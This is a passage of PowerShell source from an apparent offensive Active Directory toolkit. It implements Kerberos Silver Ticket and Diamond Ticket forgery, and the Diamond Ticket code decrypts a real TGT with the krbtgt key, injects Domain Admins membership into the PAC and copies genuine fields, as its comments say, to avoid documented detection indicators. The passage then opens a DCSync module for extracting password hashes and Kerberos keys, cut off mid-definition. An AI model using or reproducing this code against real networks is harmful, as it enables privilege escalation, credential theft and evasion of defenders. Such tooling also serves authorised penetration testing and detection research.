    $serviceHost = $spnParts[1]  # Keep port if present (e.g., "sql01.contoso.com:1433")

    # Generate random session key with proper resource disposal
    $sessionKeyLength = if ($EncryptionType -eq 18) { 32 } else { 16 }
    $sessionKey = [byte[]]::new($sessionKeyLength)
    $rng = $null
    try {
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        $rng.GetBytes($sessionKey)
    } finally {
        if ($rng) { $rng.Dispose() }
    }

    # Calculate times (RenewTill = EndTime for simplicity, matches Rubeus behavior)
    $now = [datetime]::UtcNow
    $authTime = $now
    $startTime = $now
    $endTime = $now.AddDays($ValidityDays)
    $renewTill = $endTime

    # Parse domain info
    $domainNetBIOS = $Domain.Split('.')[0].ToUpper()
    $domainFQDN = $Domain.ToUpper()

    Write-Log "[New-SilverTicket] Service: $serviceName, Host: $serviceHost"

    # Build PAC (required by modern DCs due to CVE-2021-42287 enforcement)
    # AuthTime is used for CLIENT_INFO.ClientId and MUST match EncTicketPart.authtime
    $pacResult = Build-PAC -UserName $UserName -Domain $domainNetBIOS `
        -DnsDomainName $Domain -DomainSID $DomainSID -UserRID $UserRID `
        -GroupRIDs $GroupRIDs -ExtraSIDs $ExtraSIDs `
        -EncryptionType $EncryptionType -LogonTime $authTime -AuthTime $authTime

    $pacData = Complete-PACSignatures -PACData $pacResult.PACData `
        -ServerChecksumOffset $pacResult.ServerChecksumOffset `
        -KDCChecksumOffset $pacResult.KDCChecksumOffset `
        -Key $Key -EncryptionType $EncryptionType

    # Build EncTicketPart (no Initial flag for service tickets)
    $ticketFlags = New-TicketFlags -Forwardable -Renewable -PreAuthent

    $encTicketPart = New-EncTicketPart -SessionKey $sessionKey -SessionKeyType $EncryptionType `
        -ClientRealm $domainFQDN -ClientName $UserName `
        -AuthTime $authTime -StartTime $startTime -EndTime $endTime -RenewTill $renewTill `
        -PACData $pacData -TicketFlags $ticketFlags

    # Encrypt EncTicketPart using Windows native crypto (same as Rubeus)
    $keyUsage = 2
    $encryptedTicketPart = Protect-KerberosNative -Key $Key -Data $encTicketPart `
        -KeyUsage $keyUsage -EncryptionType $EncryptionType

    # Build Ticket with service principal
    $ticket = New-KerberosTicket -Realm $domainFQDN -ServerName $serviceName `
        -ServerInstance $serviceHost -EncryptedPart $encryptedTicketPart `
        -EncryptionType $EncryptionType -Kvno $kvno

    # Build KRB-CRED
    $krbCred = Build-KRBCred -Ticket $ticket -SessionKey $sessionKey `
        -SessionKeyType $EncryptionType -Realm $domainFQDN -ClientName $UserName `
        -ServerName $serviceName -ServerInstance $serviceHost `
        -AuthTime $authTime -StartTime $startTime -EndTime $endTime -RenewTill $renewTill `
        -TicketFlags $ticketFlags

    # Save if requested
    $outputPath = $null
    if ($OutputKirbi) {
        $outputPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($OutputKirbi)
        [System.IO.File]::WriteAllBytes($outputPath, $krbCred)
        Write-Log "[New-SilverTicket] Saved to: $outputPath"
    }

    return [PSCustomObject]@{
        Success = $true
        Mode = 'Silver'
        UserName = $UserName
        Domain = $domainFQDN
        DomainSID = $DomainSID
        UserRID = $UserRID
        ServicePrincipalName = $ServicePrincipalName
        GroupRIDs = $GroupRIDs
        ExtraSIDs = $ExtraSIDs
        EncryptionType = $EncryptionType
        EncryptionTypeName = switch ($EncryptionType) { 17 { "AES128-CTS" } 18 { "AES256-CTS" } 23 { "RC4-HMAC" } }
        Kvno = $Kvno
        AuthTime = $authTime
        StartTime = $startTime
        EndTime = $endTime
        RenewTill = $renewTill
        TicketBytes = $ticket
        KirbiBytes = $krbCred
        SessionKey = $sessionKey
        SessionKeyBase64 = [Convert]::ToBase64String($sessionKey)
        KirbiBase64 = [Convert]::ToBase64String($krbCred)
        OutputPath = $outputPath
        Message = "Silver Ticket created successfully for $ServicePrincipalName"
    }
}

#endregion

#region Diamond Ticket Implementation

function New-DiamondTicket {
    <#
    .SYNOPSIS
        Creates a Diamond Ticket by acquiring a real TGT and rebuilding it with elevated privileges.

    .DESCRIPTION
        Diamond Ticket "Recut" Approach:
        1. Decrypts the provided (genuine) TGT and PARSES its real PAC: identity fields
           (FullName, profile, logon counters), real group memberships + attributes,
           PrimaryGroupId, UserAccountControl, password timestamps, session key.
        2. Rebuilds the ticket using the proven Golden Ticket PAC builder, but feeds the
           real per-user fields back in (-SourceInfo) so the new LOGON_INFO mirrors the
           legitimate one instead of leaving the blank/zeroed fields that betray a forgery.
        3. APPENDS the requested groups (e.g., Domain Admins 512) to the user's real groups
           rather than replacing them with the well-known default set (a documented IOC).
        4. Preserves the original session key and timestamps so TGS-REQ works.

        OPSEC Behavior:
        - If -UserName is NOT provided: Keeps the original TGT user (stealthier - matches AS-REQ logs)
        - If -UserName IS provided: Impersonates that user (useful for specific scenarios)

        OPSEC Value: A legitimate AS-REQ was issued to obtain the base TGT, AND the rebuilt
        PAC carries the genuine directory-derived attributes, so PAC content inspection no
        longer reveals the synthetic fingerprints of the original diamond PoC.

        This rebuild-with-real-data approach avoids complex NDR in-place patching (which is
        fragile across AD environments) while still preserving the authentic PAC contents.

        Note: If the base TGT has no parseable PAC, it falls back to a synthetic rebuild.

    .PARAMETER UserName
        Optional. The user to impersonate in the forged ticket.
        If not specified, preserves the original TGT user (OPSEC default).
        If specified, the ticket will be forged for this user instead.

    .PARAMETER BaseUserTGT
        The raw bytes of a legitimate TGT (KRB-CRED/.kirbi format).

    .PARAMETER Key
        The krbtgt key bytes for decrypting/encrypting the ticket.

    .PARAMETER GroupRIDs
        Group RIDs for the new PAC (replaces original groups).

    .PARAMETER ExtraSIDs
        Extra SIDs to add to the PAC.

    .NOTES
        Requirements:
        - A legitimate TGT (can be obtained via Invoke-KerberosAuth or from memory)
        - The krbtgt key (NT-Hash or AES key matching encryption type)
    #>
    [CmdletBinding()]
    param(
        [string]$UserName,
        [string]$Domain,
        [string]$DomainSID,
        [uint32]$UserRID,
        [byte[]]$Key,
        [int]$EncryptionType,
        [byte[]]$BaseUserTGT,
        [uint32[]]$GroupRIDs,
        [string[]]$ExtraSIDs,
        [int]$Kvno,
        [string]$OutputKirbi
    )

    Write-Log "[New-DiamondTicket] Building Diamond Ticket (Hybrid: TGT + Golden rebuild)..."

    try {
        # ============================================
        # PHASE 1: Extract information from base TGT
        # ============================================

        Write-Log "[New-DiamondTicket] Phase 1: Parsing base TGT..."
        $krbCred = Read-KRBCred -KirbiBytes $BaseUserTGT

        if (-not $krbCred -or -not $krbCred.TicketEncPart) {
            throw "Failed to parse base TGT or no encrypted ticket part found"
        }

        Write-Log "[New-DiamondTicket] Base TGT: $($krbCred.ClientName)@$($krbCred.ClientRealm)"

        # Use ticket's kvno for consistency
        $originalKvno = $krbCred.TicketKvno
        if ($Kvno -ne $originalKvno) {
            Write-Log "[New-DiamondTicket] Using ticket kvno ($originalKvno) instead of provided kvno ($Kvno)"
            $Kvno = $originalKvno
        }

        # Validate that the provided key type matches the ticket's encryption type
        $ticketEType = $krbCred.TicketEType
        $etypeNames = @{ 17 = "AES128-CTS"; 18 = "AES256-CTS"; 23 = "RC4-HMAC" }
        $ticketETypeName = if ($etypeNames.ContainsKey($ticketEType)) { $etypeNames[$ticketEType] } else { "etype $ticketEType" }
        $providedETypeName = if ($etypeNames.ContainsKey($EncryptionType)) { $etypeNames[$EncryptionType] } else { "etype $EncryptionType" }

        if ($ticketEType -ne 0 -and $ticketEType -ne $EncryptionType) {
            throw ("Encryption type mismatch: The base TGT is encrypted with $ticketETypeName (etype $ticketEType) " +
                "but the provided krbtgt key is $providedETypeName (etype $EncryptionType). " +
                "You need the krbtgt $ticketETypeName key to decrypt this ticket. " +
                "Alternatively, request a new TGT with forced RC4 encryption using -BaseUserNTHash (if the DC allows etype downgrade).")
        }

        Write-Log "[New-DiamondTicket] Ticket etype ($ticketETypeName) matches provided key"

        # Decrypt to extract PAC info
        Write-Log "[New-DiamondTicket] Decrypting EncTicketPart..."
        $keyUsage = 2
        $decryptedTicketPart = Unprotect-KerberosNative -Key $Key -CipherText $krbCred.TicketEncPart `
            -KeyUsage $keyUsage -EncryptionType $EncryptionType

        if (-not $decryptedTicketPart -or $decryptedTicketPart.Length -lt 10) {
            throw "Failed to decrypt EncTicketPart - wrong key or encryption type?"
        }

        # Parse EncTicketPart to get session key and timestamps
        $encTicketPart = Read-EncTicketPart -EncTicketPartBytes $decryptedTicketPart
        if (-not $encTicketPart -or -not $encTicketPart.SessionKey) {
            throw "Failed to parse EncTicketPart or no session key found"
        }

        # Extract session key from original ticket (CRITICAL: preserve for KRB-CRED)
        $sessionKey = $encTicketPart.SessionKey
        $sessionKeyType = $encTicketPart.SessionKeyType
        Write-Log "[New-DiamondTicket] Original session key: $($sessionKey.Length) bytes, etype $sessionKeyType"

        # Parse PAC to get user/domain info
        $parsedPAC = $null
        if ($encTicketPart.PAC -and $encTicketPart.PAC.Length -gt 10) {
            $parsedPAC = Read-PAC -PACData $encTicketPart.PAC
            if ($parsedPAC) {
                Write-Log "[New-DiamondTicket] Original PAC: User=$($parsedPAC.UserName), Groups=$($parsedPAC.GroupRIDs -join ',')"

                # Use PAC data as fallback for missing parameters
                if (-not $Domain) { $Domain = $parsedPAC.Domain }
                if (-not $DomainSID) { $DomainSID = $parsedPAC.DomainSID }
                if (-not $UserRID -or $UserRID -eq 0) { $UserRID = $parsedPAC.UserRID }
            }
        }

        # Use KRB-CRED client name as fallback
        if (-not $UserName) { $UserName = $krbCred.ClientName }
        if (-not $Domain) { $Domain = $krbCred.ClientRealm }

        # Preserve original timestamps from ticket
        $authTime = $encTicketPart.AuthTime
        $startTime = $encTicketPart.StartTime
        $endTime = $encTicketPart.EndTime
        $renewTill = $encTicketPart.RenewTill
        $ticketFlags = $encTicketPart.Flags
        # Note: $ticketFlags can be 0 (valid, all flags off), so check for $null explicitly
        if ($null -eq $ticketFlags) {
            $ticketFlags = New-TicketFlags -Forwardable -Renewable -Initial -PreAuthent
        }

        Write-Log "[New-DiamondTicket] Extracted: User=$UserName, Domain=$Domain, SID=$DomainSID, RID=$UserRID"
        Write-Log "[New-DiamondTicket] Timestamps: Auth=$authTime, Start=$startTime, End=$endTime"

        # ============================================
        # "RECUT": Preserve the genuine PAC, inject only groups
        # ============================================
        # A true Diamond Ticket modifies the legitimate PAC in place rather than replacing it
        # with a synthetic one. The original PoC's tell-tale fingerprints (blank FullName,
        # LogonCount=0, NORMAL_ACCOUNT UAC, and the well-known default group set
        # 512/513/518/519/520) are a documented IOC. We instead:
        #   - APPEND the requested groups to the user's real group memberships (no replace)
        #   - carry over the real identity/session fields (FullName, LogonCount, profile, etc.)
        #   - keep the real PrimaryGroupId and UserAccountControl
        # so the rebuilt LOGON_INFO matches what the KDC actually issued.
        $diamondSourceInfo = $null
        $effectiveGroupRIDs = $GroupRIDs
        $effectiveExtraSIDs = $ExtraSIDs
        $effectivePrimaryGroupRID = $null
        $effectiveUAC = $null
        $effectiveLogonTime = $null

        if ($parsedPAC) {
            # Merge groups: real memberships first (keeping their real attributes), then any
            # requested group not already present (with default attributes).
            $origGroups = @($parsedPAC.GroupRIDs)
            $origAttrs  = @($parsedPAC.GroupAttributes)
            $mergedGroups = @()
            $mergedAttrs  = @()
            for ($i = 0; $i -lt $origGroups.Count; $i++) {
                $mergedGroups += [uint32]$origGroups[$i]
                if ($i -lt $origAttrs.Count) {
                    $mergedAttrs += [uint32]$origAttrs[$i]
                } else {
                    $mergedAttrs += [uint32]$Script:DEFAULT_GROUP_ATTRIBUTES
                }
            }
            foreach ($g in $GroupRIDs) {
                if ($mergedGroups -notcontains [uint32]$g) {
                    $mergedGroups += [uint32]$g
                    $mergedAttrs  += [uint32]$Script:DEFAULT_GROUP_ATTRIBUTES
                }
            }
            $effectiveGroupRIDs = $mergedGroups

            # Merge ExtraSIDs (e.g. asserted-identity S-1-18-x present in modern TGTs) with any requested.
            $mergedExtra = @()
            foreach ($s in @($parsedPAC.ExtraSIDs)) { if ($s) { $mergedExtra += $s } }
            foreach ($s in @($ExtraSIDs)) { if ($s -and ($mergedExtra -notcontains $s)) { $mergedExtra += $s } }
            $effectiveExtraSIDs = $mergedExtra

            if ($parsedPAC.PrimaryGroupRID) { $effectivePrimaryGroupRID = [uint32]$parsedPAC.PrimaryGroupRID }
            if ($null -ne $parsedPAC.UserAccountControl) { $effectiveUAC = [uint32]$parsedPAC.UserAccountControl }
            if ($parsedPAC.LogonTime) { $effectiveLogonTime = $parsedPAC.LogonTime }

            # Carry the rich per-user identity/session fields into the rebuilt LOGON_INFO.
            $diamondSourceInfo = @{
                FullName              = $parsedPAC.FullName
                LogonScript           = $parsedPAC.LogonScript
                ProfilePath           = $parsedPAC.ProfilePath
                HomeDirectory         = $parsedPAC.HomeDirectory
                HomeDirectoryDrive    = $parsedPAC.HomeDirectoryDrive
                LogonServer           = $parsedPAC.LogonServer
                LogonCount            = $parsedPAC.LogonCount
                BadPasswordCount      = $parsedPAC.BadPasswordCount
                GroupAttributes       = $mergedAttrs
                LogoffTimeRaw         = $parsedPAC.LogoffTimeRaw
                KickOffTimeRaw        = $parsedPAC.KickOffTimeRaw
                PasswordLastSetRaw    = $parsedPAC.PasswordLastSetRaw
                PasswordCanChangeRaw  = $parsedPAC.PasswordCanChangeRaw
                PasswordMustChangeRaw = $parsedPAC.PasswordMustChangeRaw
            }
            Write-Log "[New-DiamondTicket] Recut: real groups [$($origGroups -join ',')] + injected -> [$($effectiveGroupRIDs -join ',')]"
        }
        else {
            Write-Log "[New-DiamondTicket] No parseable PAC in base TGT - falling back to synthetic PAC rebuild" -Level Warning
        }

        # ============================================
        # PHASE 2: Rebuild using Golden Ticket logic
        # ============================================

        Write-Log "[New-DiamondTicket] Phase 2: Rebuilding with Golden Ticket implementation..."

        # Parse domain info (same as Golden Ticket)
        $domainNetBIOS = $Domain.Split('.')[0].ToUpper()
        $domainFQDN = $Domain.ToUpper()
        $domainLower = $Domain.ToLower()

        Write-Log "[New-DiamondTicket] Target: $UserName (RID $UserRID), Groups: $($effectiveGroupRIDs -join ', ')"

        # Build PAC using Golden Ticket's Build-PAC (proven to work)
        Write-Log "[New-DiamondTicket] Building new PAC with merged groups..."

        # CRITICAL: AuthTime must be truncated to second precision for CLIENT_INFO match
        $authTimeRounded = [datetime]::new($authTime.Year, $authTime.Month, $authTime.Day,
            $authTime.Hour, $authTime.Minute, $authTime.Second, [System.DateTimeKind]::Utc)

        # LogonTime: prefer the real value from the genuine PAC (recut), else fall back to authtime.
        $pacLogonTime = if ($effectiveLogonTime) { $effectiveLogonTime } else { $authTimeRounded }

        $buildPacParams = @{
            UserName       = $UserName
            Domain         = $domainNetBIOS
            DnsDomainName  = $Domain
            DomainSID      = $DomainSID
            UserRID        = $UserRID
            GroupRIDs      = $effectiveGroupRIDs
            ExtraSIDs      = $effectiveExtraSIDs
            EncryptionType = $EncryptionType
            LogonTime      = $pacLogonTime
            AuthTime       = $authTimeRounded
        }
        if ($null -ne $effectivePrimaryGroupRID) { $buildPacParams['PrimaryGroupRID'] = $effectivePrimaryGroupRID }
        if ($null -ne $effectiveUAC)             { $buildPacParams['UserAccountControl'] = $effectiveUAC }
        if ($diamondSourceInfo)                  { $buildPacParams['SourceInfo'] = $diamondSourceInfo }

        $pacResult = Build-PAC @buildPacParams

        $pacData = Complete-PACSignatures -PACData $pacResult.PACData `
            -ServerChecksumOffset $pacResult.ServerChecksumOffset `
            -KDCChecksumOffset $pacResult.KDCChecksumOffset `
            -Key $Key -EncryptionType $EncryptionType

        Write-Log "[New-DiamondTicket] New PAC: $($pacData.Length) bytes"

        # Build new EncTicketPart with new PAC but original session key and timestamps
        $newEncTicketPart = New-EncTicketPart -SessionKey $sessionKey -SessionKeyType $sessionKeyType `
            -ClientRealm $domainFQDN -ClientName $UserName `
            -AuthTime $authTimeRounded -StartTime $startTime -EndTime $endTime -RenewTill $renewTill `
            -PACData $pacData -TicketFlags $ticketFlags

        # Encrypt with krbtgt key
        $encryptedTicketPart = Protect-KerberosNative -Key $Key -Data $newEncTicketPart `
            -KeyUsage $keyUsage -EncryptionType $EncryptionType

        Write-Log "[New-DiamondTicket] Encrypted EncTicketPart: $($encryptedTicketPart.Length) bytes"

        # Build Ticket (same as Golden)
        $ticket = New-KerberosTicket -Realm $domainFQDN -ServerName "krbtgt" `
            -ServerInstance $domainLower -EncryptedPart $encryptedTicketPart `
            -EncryptionType $EncryptionType -Kvno $kvno

        # Build KRB-CRED with ORIGINAL session key (critical for TGS-REQ to work)
        $newKrbCred = Build-KRBCred -Ticket $ticket -SessionKey $sessionKey `
            -SessionKeyType $sessionKeyType -Realm $domainFQDN -ClientName $UserName `
            -ServerName "krbtgt" -ServerInstance $domainLower `
            -AuthTime $authTimeRounded -StartTime $startTime -EndTime $endTime -RenewTill $renewTill `
            -TicketFlags $ticketFlags

        Write-Log "[New-DiamondTicket] KRB-CRED: $($newKrbCred.Length) bytes"

        # Save if requested
        $outputPath = $null
        if ($OutputKirbi) {
            $outputPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($OutputKirbi)
            [System.IO.File]::WriteAllBytes($outputPath, $newKrbCred)
            Write-Log "[New-DiamondTicket] Saved to: $outputPath"
        }

        Write-Log "[New-DiamondTicket] Diamond Ticket created successfully (Hybrid approach)"

        return [PSCustomObject]@{
            Success = $true
            Mode = 'Diamond'
            UserName = $UserName
            Domain = $domainFQDN
            DomainSID = $DomainSID
            UserRID = $UserRID
            OriginalGroups = if ($parsedPAC) { $parsedPAC.GroupRIDs } else { @() }
            AddedGroups = $GroupRIDs
            GroupRIDs = $effectiveGroupRIDs
            ExtraSIDs = $effectiveExtraSIDs
            EncryptionType = $EncryptionType
            EncryptionTypeName = switch ($EncryptionType) { 17 { "AES128-CTS" } 18 { "AES256-CTS" } 23 { "RC4-HMAC" } }
            Kvno = $Kvno
            AuthTime = $authTimeRounded
            StartTime = $startTime
            EndTime = $endTime
            RenewTill = $renewTill
            TicketBytes = $ticket
            KirbiBytes = $newKrbCred
            SessionKey = $sessionKey
            SessionKeyBase64 = [Convert]::ToBase64String($sessionKey)
            KirbiBase64 = [Convert]::ToBase64String($newKrbCred)
            OutputPath = $outputPath
            Message = "Diamond Ticket created (Hybrid: TGT extracted, rebuilt with Golden implementation)"
        }
    }
    catch {
        Write-Log "[New-DiamondTicket] Error: $_" -Level Error
        return [PSCustomObject]@{
            Success = $false
            Mode = 'Diamond'
            UserName = $UserName
            Domain = $Domain
            Error = $_.Exception.Message
            Message = "Diamond Ticket creation failed: $($_.Exception.Message)"
        }
    }
}



# ----- Invoke-DCSync.ps1 -----

# Invoke-DCSync.ps1
# DCSync implementation using DRSUAPI RPC protocol
# Replicates AD objects to extract credential material (NT hashes, Kerberos keys, cleartext passwords)
#
# ============================================================================
# Embedded C# class for RPC/NDR/DRSUAPI interop
# ============================================================================

$Script:DCSyncCode = @'
using System;
using System.Collections.Generic;
using System.Runtime.ExceptionServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

namespace adPEAS
{
    #region Result Classes
    public class DCSyncResult
    {
        public bool Success;
        public string Error;
        public DCSyncUserData[] Users;
    }

    public class DCSyncUserData
    {
        public string SAMAccountName;
        public string UserPrincipalName;
        public string DisplayName;
        public byte[] ObjectSID;
        public int UserAccountControl;
        public int SAMAccountType;
        public long PwdLastSet;
        public long AccountExpires;
        public byte[] UnicodePassword;
        public byte[] NTPasswordHistory;
        public byte[] LMPassword;
        public byte[] LMPasswordHistory;
        public byte[] SupplementalCredentials;
        public string ServicePrincipalName;
        public byte[] SIDHistory;
    }
    #endregion

    #region Structs
    [StructLayout(LayoutKind.Sequential)]
    public struct DRS_EXTENSIONS_INT
    {
        public UInt32 cb;
        public UInt32 dwFlags;
        public Guid SiteObjGuid;
        public UInt32 Pid;
        public UInt32 dwReplEpoch;
        public UInt32 dwFlagsExt;
        public Guid ConfigObjGUID;
        public UInt32 dwExtCaps;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct DRS_MSG_DCINFOREQ_V1
    {
        public IntPtr Domain;
        public UInt32 InfoLevel;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct DRS_MSG_DCINFOREPLY_V2
    {
        public UInt32 cItems;
        public IntPtr rItems;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct DS_DOMAIN_CONTROLLER_INFO_2W
    {
        public IntPtr NetbiosName;
        public IntPtr DnsHostName;
        public IntPtr SiteName;
        public IntPtr SiteObjectName;
        public IntPtr ComputerObjectName;
        public IntPtr ServerObjectName;
        public IntPtr NtdsDsaObjectName;
        public UInt32 fIsPdc;
        public UInt32 fDsEnabled;
        public UInt32 fIsGc;
        public Guid SiteObjectGuid;
        public Guid ComputerObjectGuid;
        public Guid ServerObjectGuid;
        public Guid NtdsDsaObjectGuid;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct USN_VECTOR
    {
        public long usnHighObjUpdate;
        public long usnReserved;
        public long usnHighPropUpdate;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SCHEMA_PREFIX_TABLE
    {
        public UInt32 PrefixCount;
        public IntPtr pPrefixEntry;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct DSNAME
    {
        public UInt32 structLen;
        public UInt32 SidLen;
        public Guid Guid;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 28)]
        public byte[] Sid;
